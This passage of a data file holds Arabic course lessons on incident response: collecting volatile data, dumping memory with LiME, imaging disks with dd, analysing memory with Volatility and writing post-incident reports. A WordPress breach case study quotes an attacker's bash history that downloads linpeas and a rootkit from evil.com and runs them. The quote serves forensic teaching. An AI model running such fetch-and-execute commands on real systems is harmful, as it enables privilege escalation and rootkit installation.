                    "<strong>4. الوسائط المؤرشفة (النسخ الاحتياطية):</strong> الأقل تقلبًا."
                ]},
                { type: ContentType.HEADING4, text: "المبادئ الأساسية:" },
                { type: ContentType.LIST_UNORDERED, items: [
                    "<strong>الحفاظ على الأدلة:</strong> أولويتك الأولى هي الحفاظ على حالة النظام المخترق كما هي. لا تقم بإعادة تشغيله أو تشغيل برامج مكافحة الفيروسات عليه. قم بفصله عن الشبكة إذا لزم الأمر لمنع المزيد من الضرر.",
                    "<strong>سلسلة العهدة (Chain of Custody):</strong> قم بتوثيق كل خطوة تقوم بها. من حصل على ماذا، متى، ولماذا. استخدم `md5sum` أو `sha256sum` لحساب تجزئة كل قطعة من الأدلة التي تجمعها.",
                    "<strong>العمل على النسخ:</strong> لا تقم أبدًا بإجراء تحليلك على الأدلة الأصلية. قم دائمًا بإنشاء نسخة bit-by-bit واعمل على النسخة."
                ]},
              ]
            },
            {
              id: "p9_c4_s2",
              icon: "💾",
              title: "المستوى 216: دليل عملي: جمع الأدلة من نظام مخترق",
              content: [
                { type: ContentType.PARAGRAPH, text: "لنجعل الأمر عمليًا. أنت تشك في أن أحد خوادم الويب الخاصة بك قد تم اختراقه. إليك ما تفعله، بالترتيب." },
                { type: ContentType.HEADING4, text: "الخطوة 1: جمع البيانات المتقلبة (على النظام الحي)" },
                { type: ContentType.CODE_BLOCK, language: "bash", code: `# Redirect all output to a file on an external drive
exec > /mnt/usb_drive/live_response.txt 2>&1

date
uptime
w
last -n 20
ps aux
netstat -anop
lsof
# ... and more ...` },
                { type: ContentType.HEADING4, text: "الخطوة 2: تفريغ الذاكرة (الأكثر أهمية)" },
                { type: ContentType.PARAGRAPH, text: "سنستخدم LiME (Linux Memory Extractor). ستحتاج إلى تجميعه مسبقًا لنواة الخادم المحددة." },
                { type: ContentType.CODE_BLOCK, language: "bash", code: `sudo insmod lime-5.15.0-41-generic.ko "path=/mnt/usb_drive/ram.dump format=lime"
# ... wait for it to complete ...
sudo rmmod lime` },
                { type: ContentType.HEADING4, text: "الخطوة 3: تصوير القرص" },
                { type: ContentType.PARAGRAPH, text: "بعد جمع البيانات المتقلبة، يمكنك تصوير القرص. `dd` هي الأداة الكلاسيكية." },
                { type: ContentType.CODE_BLOCK, language: "bash", code: `# Create a bit-for-bit image of the primary disk (sda) to an external drive
sudo dd if=/dev/sda of=/mnt/usb_drive/disk_image.dd bs=4M conv=noerror,sync

# Create a hash of the image to verify its integrity
sha256sum /mnt/usb_drive/disk_image.dd > /mnt/usb_drive/disk_image.sha256` },
                { type: ContentType.PARAGRAPH, text: "لديك الآن نسخة كاملة ومحافظ عليها من النظام المخترق يمكنك تحليلها بأمان دون اتصال بالإنترنت." },
              ]
            },
            {
              id: "p9_c4_s3",
              icon: "📜",
              title: "المستوى 217: دراسة حالة: تحليل سجلات اختراق WordPress",
              content: [
                { type: ContentType.PARAGRAPH, text: "هنا تؤتي جهودنا في المراقبة ثمارها. **السيناريو:** تم اختراق خادم ويب يستضيف موقع WordPress. لنقم بتجميع القصة معًا." },
                { type: ContentType.HEADING4, text: "1. سجلات Nginx (`access.log`)" },
                { type: ContentType.PREFORMATTED_TEXT, text: `1.2.3.4 - - [10/Oct/2023:14:32:15 +0000] "POST /wp-content/plugins/vulnerable-plugin/upload.php HTTP/1.1" 200 ...` },
                { type: ContentType.PARAGRAPH, text: "**الاكتشاف:** نرى طلب POST إلى ملف `upload.php` في إضافة معروفة بأنها ضعيفة. هذا هو على الأرجح ناقل الهجوم الأولي." },
                { type: ContentType.HEADING4, text: "2. سجلات المصادقة (`auth.log`)" },
                { type: ContentType.PREFORMATTED_TEXT, text: `Oct 10 14:35:01 web-server sshd[12345]: Accepted publickey for www-data from 1.2.3.4 port 54321 ssh2: ...` },
                { type: ContentType.PARAGRAPH, text: "**الاكتشاف:** يا إلهي! بعد ثلاث دقائق من التحميل، نرى تسجيل دخول SSH ناجحًا كمستخدم `www-data` من نفس عنوان IP للمهاجم. هذا يعني أن الحمولة التي تم تحميلها كانت على الأرجح بابًا خلفيًا أضاف مفتاح SSH العام للمهاجم إلى `/var/www/.ssh/authorized_keys`." },
                { type: ContentType.HEADING4, text: "3. سجل أوامر Bash (`.bash_history` لـ www-data)" },
                { type: ContentType.PREFORMATTED_TEXT, text: `wget http://evil.com/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
wget http://evil.com/rootkit.tar.gz
tar -xvf rootkit.tar.gz
./install.sh` },
                { type: ContentType.PARAGRAPH, text: "**الاكتشاف:** القصة الكاملة. استخدم المهاجم `linpeas.sh` (أداة شائعة لتصعيد الامتيازات) للبحث عن نقاط ضعف، ثم قام بتنزيل وتثبيت rootkit. لقد قمنا الآن بتتبع الهجوم من الاختراق الأولي إلى تصعيد الامتيازات إلى الإخفاء." },
              ]
            },
            {
              id: "p9_c4_s4",
              icon: "🧠",
              title: "المستوى 218: دراسة حالة: تحليل الذاكرة مع Volatility",
              content: [
                { type: ContentType.PARAGRAPH, text: "تحليل نسخة الذاكرة هو مجال متخصص ولكنه قوي للغاية. **السيناريو:** بعد الهجوم أعلاه، قمنا بتفريغ ذاكرة الخادم. نعلم أن المهاجم قام بتثبيت rootkit. كيف نجده؟" },
                { type: ContentType.HEADING4, text: "استخدام Volatility 3" },
                { type: ContentType.PARAGRAPH, text: "Volatility هي أداة سطر أوامر لتحليل تفريغات الذاكرة." },
                { type: ContentType.CODE_EXPLANATION, language: "bash", codeTitle: "أوامر Volatility", code: `# 1. قائمة العمليات
python3 vol.py -f /path/to/ram.dump linux.pslist

# 2. البحث عن العمليات المخفية
python3 vol.py -f /path/to/ram.dump linux.psscan

# 3. عرض اتصالات الشبكة
python3 vol.py -f /path/to/ram.dump linux.netstat

# 4. البحث عن وحدات النواة المشبوهة
python3 vol.py -f /path/to/ram.dump linux.lsmod`, explanations: [
                    { lines: "2", explanation: "هذا يعرض قائمة العمليات التي كانت قيد التشغيل، على غرار `ps`. قد ترى عملية مشبوهة هنا." },
                    { lines: "5", explanation: "`psscan` يبحث في الذاكرة عن هياكل العمليات التي تم 'فك ربطها' (unlinked) من قائمة العمليات العادية. هذه تقنية شائعة للجذور الخفية. إذا أظهر `psscan` عملية لم تكن في `pslist`، فقد وجدت عملية مخفية." },
                    { lines: "8", explanation: "هذا يعرض الاتصالات المفتوحة في وقت التفريغ. قد ترى اتصال C2 (Command and Control) صادرًا إلى خادم المهاجم." },
                    { lines: "11", explanation: "ابحث عن أي وحدات نواة (kernel modules) تبدو غير عادية أو تحاول إخفاء نفسها." }
                ]},
              ]
            },
            {
              id: "p9_c4_s5",
              icon: "📄",
              title: "المستوى 219: كتابة تقرير ما بعد الاختراق الفعال",
              content: [
                { type: ContentType.PARAGRAPH, text: "بعد اكتمال التحقيق، من الضروري كتابة تقرير شامل لما بعد الحادثة. هذا ليس فقط لتوثيق ما حدث، بل هو أداة تعلم حيوية للمؤسسة." },
                { type: ContentType.HEADING4, text: "قالب تقرير ما بعد الحادثة:" },
                { type: ContentType.LIST_UNORDERED, items: [
                    "<strong>1. ملخص تنفيذي:</strong> (1-3 جمل) ماذا حدث، ما هو التأثير، وما هو الإصلاح. مكتوب لغير التقنيين.",
                    "<strong>2. التأثير:</strong> (فقرة) ما هو التأثير على العملاء؟ هل تم تسريب بيانات؟ كم من الوقت استمر الانقطاع؟",
                    "<strong>3. السبب الجذري:</strong> (نقاط) لماذا حدث هذا؟ استخدم تقنية 'الأسباب الخمسة' للتعمق. (مثال: لماذا تمكنا من الاختراق؟ -> إضافة WordPress ضعيفة. -> لماذا كانت لدينا إضافة ضعيفة؟ -> لم يكن لدينا عملية تحديث آلية...)",
                    "<strong>4. الجدول الزمني المفصل:</strong> (جدول) قائمة دقيقة بالأحداث الرئيسية مع الطوابع الزمنية.",
                    "<strong>5. الحل:</strong> (فقرة) ما هي الخطوات التي تم اتخاذها لحل الحادثة الفورية؟",
                    "<strong>6. الدروس المستفادة:</strong> (نقاط) ما الذي سار بشكل جيد في استجابتنا؟ ما الذي يمكن تحسينه؟",
                    "<strong>7. بنود العمل:</strong> (جدول) الأهم من ذلك كله. قائمة بالمهام المحددة، الموكلة إلى أشخاص، مع مواعيد نهائية، لمنع هذا النوع من الحوادث من الحدوث مرة أخرى."
                ]},
              ]
            }
        ]
    },
     {
        id: "p9_c5", chapterTitle: "الفصل الخامس: الخاتمة والخطوات التالية",
        sections: [
            {
              id: "p9_c5_s1",
              icon: "🏁",
              title: "المستوى 220: مراجعة الرحلة: من VPS إلى DarkOps",
              content: [
                { type: ContentType.PARAGRAPH, text: "لقد قطعنا شوطًا طويلاً. لقد بدأت بخادم افتراضي فارغ، قطعة أرض رقمية. لقد قمت بتحصينه، وبنيت عليه تطبيقًا، وأتمتت نشره، وأنشأت أنظمة لمراقبته، والآن، تعلمت كيف تدافع عنه بشكل استباقي وتفكر مثل خصومك. لم تعد مجرد مطور؛ أنت مهندس بنية تحتية، وممارس DevOps، ومدافع أمني. لقد بنيت قلعة، وزودتها بالحراس، والآن وضعت فيها الأفخاخ والممرات السرية. لقد انتقلت من كونك مدافعًا سلبيًا إلى صياد نشط." },
              ]
            },
            {
              id: "p9_c5_s2",
              icon: "🤔",
              title: "المستوى 221: بناء عقلية أمنية: الثقة الصفرية والافتراض بالاختراق",
              content: [
                { type: ContentType.PARAGRAPH, text: "الدرس الأكثر أهمية في هذا الباب، وفي الأمن بشكل عام، هو أنه ليس منتجًا تشتريه أو قائمة تحقق تكملها. إنه عقلية وعملية مستمرة." },
                { type: ContentType.HEADING4, text: "مبدأ الثقة الصفرية (Zero Trust)" },
                { type: ContentType.PARAGRAPH, text: "لا تثق أبدًا، تحقق دائمًا. لا تفترض أن الطلب آمن لأنه يأتي من داخل شبكتك. تحقق من الهوية والمصادقة والأذونات في كل خطوة." },
                { type: ContentType.HEADING4, text: "مبدأ الافتراض بالاختراق (Assume Breach)" },
                { type: ContentType.PARAGRAPH, text: "صمم أنظمتك مع الافتراض بأن المهاجمين موجودون بالفعل داخل شبكتك. هذا يغير تركيزك من الدفاع المحيطي فقط إلى التجزئة الدقيقة، والمراقبة الداخلية، والحد من التأثير. إذا تم اختراق خادم الويب الخاص بك، فكيف تمنع المهاجم من الوصول إلى قاعدة البيانات؟ هذا هو السؤال الذي يجيب عليه مبدأ الافتراض بالاختراق." },
              ]
            },
            {
              id: "p9_c5_s3",
              icon: "📰",
              title: "المستوى 222: مواكبة أحدث التهديدات والتقنيات",
              content: [
                { type: ContentType.PARAGRAPH, text: "المشهد الأمني يتغير باستمرار. تظهر ثغرات جديدة وأساليب هجوم جديدة كل يوم. البقاء على اطلاع أمر بالغ الأهمية. إليك بعض الموارد للبقاء على اطلاع:" },
                { type: ContentType.LIST_UNORDERED, items: [
                    "<strong>النشرات الإخبارية:</strong> Risky Business, SANS NewsBites, TLDR Sec.",
                    "<strong>المدونات:</strong> Krebs on Security, Schneier on Security, The Hacker News.",
                    "<strong>المؤتمرات (على YouTube):</strong> DEF CON, Black Hat, DerbyCon.",
                    "<strong>Subreddits:</strong> r/netsec, r/blueteamsec, r/cybersecurity.",
                    "<strong>البودكاست:</strong> Darknet Diaries, Security Now."
                ]},
              ]
            },
            {
              id: "p9_c5_s4",
              icon: "🤝",
              title: "المستوى 223: المساهمة في مجتمع المصادر المفتوحة",
              content: [
                { type: ContentType.PARAGRAPH, text: "كل أداة تقريبًا استخدمناها في هذا الكتاب هي مفتوحة المصدر. لقد استفدت من عمل آلاف المطورين. فكر في رد الجميل. يمكنك المساهمة عن طريق الإبلاغ عن الأخطاء، أو تحسين الوثائق، أو المساعدة في فرز المشكلات، أو حتى المساهمة بالكود في الأدوات التي تستخدمها وتعتمد عليها. إن المساهمة في أداة أمان مثل Fail2Ban أو Wazuh هي طريقة رائعة للتعلم العميق وإحداث تأثير حقيقي." },
              ]
            },
            {
              id: "p9_c5_s5",
              icon: "🚀",
              title: "المستوى 224: الرحلة لا تنتهي: بناء مختبرك والمشاركة في CTFs",
              content: [
                { type: ContentType.PARAGRAPH, text: "هذا الكتاب ليس نهاية رحلتك، بل هو بداية قوية. لقد زودك بالأساس والمفاهيم والعقلية اللازمة للتعامل مع أي تحدٍ تقريبًا في عالم الواجهة الخلفية والبنية التحتية. لكي تنمو حقًا، يجب أن تمارس." },
                { type: ContentType.HEADING4, text: "بناء مختبر منزلي" },
                { type: ContentType.PARAGRAPH, text: "احصل على بعض أجهزة Raspberry Pis أو خوادم قديمة. قم بتثبيت Proxmox أو ESXi. قم ببناء شبكتك الخاصة، وقم بإعداد جدران حماية، وقم بمهاجمة أجهزتك الخاصة (بشكل أخلاقي). المختبر المنزلي هو ملعبك الآمن للتجربة والكسر والتعلم." },
                { type: ContentType.HEADING4, text: "المشاركة في مسابقات التقاط العلم (CTFs)" },
                { type: ContentType.PARAGRAPH, text: "CTFs هي مسابقات أمنية حيث تتنافس لحل التحديات واختراق الأنظمة (المصممة خصيصًا لهذا الغرض). مواقع مثل Hack The Box و TryHackMe هي نقاط انطلاق ممتازة. إنها أفضل طريقة لتطبيق مهاراتك بشكل عملي وتعلم تقنيات هجومية جديدة، مما يجعلك مدافعًا أفضل." },
                { type: ContentType.HEADING4, text: "الشهادات" },
                { type: ContentType.PARAGRAPH, text: "إذا كنت ترغب في ممارسة مهنة في مجال الأمن، ففكر في الحصول على شهادات مثل CompTIA Security+ (للمبتدئين)، و Offensive Security Certified Professional (OSCP) (للاختراق الأخلاقي)، وشهادات GIAC (للدفاع والتحليل الجنائي). إنها تثبت معرفتك وتفتح الأبواب." },
                { type: ContentType.PARAGRAPH, text: "العالم السحابي واسع، ومجال الأمن عميق، وتقنيات الحاويات تتطور باستمرار. استمر في البناء، استمر في التجربة، استمر في كسر الأشياء، والأهم من ذلك، استمر في التعلم. الرحلة لا تنتهي أبدًا. حظًا سعيدًا!" },
              ]
            }
        ]
    }
  ]
};
